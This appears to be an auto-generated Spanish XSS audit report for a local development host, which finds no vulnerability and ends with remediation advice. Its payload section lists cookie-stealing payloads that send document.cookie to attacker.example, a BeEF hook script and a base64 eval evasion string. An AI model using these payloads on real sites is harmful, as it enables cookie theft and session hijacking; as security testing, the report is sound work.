# Informe de Auditoría XSS - Contexto Kali

Fecha: Mon Apr 27 18:25:53 UTC 2026
Objetivo: http://web.dev.local:8082
VULN_FOUND: false
VULN_EXPLOITED: false

## Resumen de Reconocimiento
- Forms detectados en la página:

">


- Links detectados:



- Endpoints donde el payload fue reflejado:



- Headers reflejados:



## Comandos ejecutados (curl)
curl -s -D - "http://web.dev.local:8082" -o /tmp/home.html\n# Tested GET endpoints by appending payload to: /, ?q=, ?search=, ?s=, ?id=, ?term=\n# Header tests: User-Agent and Referer reflections via curl -H\n

## Comandos recomendados de Kali (no ejecutados):
dalfox url http://web.dev.local:8082 -b 'XSS-Bypass-Strings-Brute.txt' --payload "<script>alert(1)</script>"\nxsstrike --url http://web.dev.local:8082 --data "q=<script>alert(1)</script>"\nffuf -u http://web.dev.local:8082/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c\n

## Payloads de prueba y explotación
Simple alert payload: <script>alert(1)</script>\nCookie exfil (image): <img src="http://attacker.example/collect?c="+document.cookie>\nFetch exfil (obfuscated): <script>fetch('http://attacker.example/collect?c='+btoa(document.cookie))</script>\nBeEF hook: <script src="http://attacker.example:3000/hook.js"></script>\nEvent-based evasion: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>" (base64 for alert(1))\n

## Evidencia
- Se buscó el payload literal "<script>alert(1)</script>" en las respuestas HTTP. Si aparece sin escape, indica ejecución JS posible en contexto del navegador.

## Impacto y recomendaciones
- Impacto: Posible ejecución de código JavaScript en el contexto del sitio; permite exfiltración de cookies/localStorage, ejecución de hooks externos, y acciones en nombre del usuario.
- Recomendaciones: Aplicar escaping contextual en salida HTML/JS, usar Content Security Policy (CSP), validar/filtrar entradas, y sanear cabeceras reflejadas.

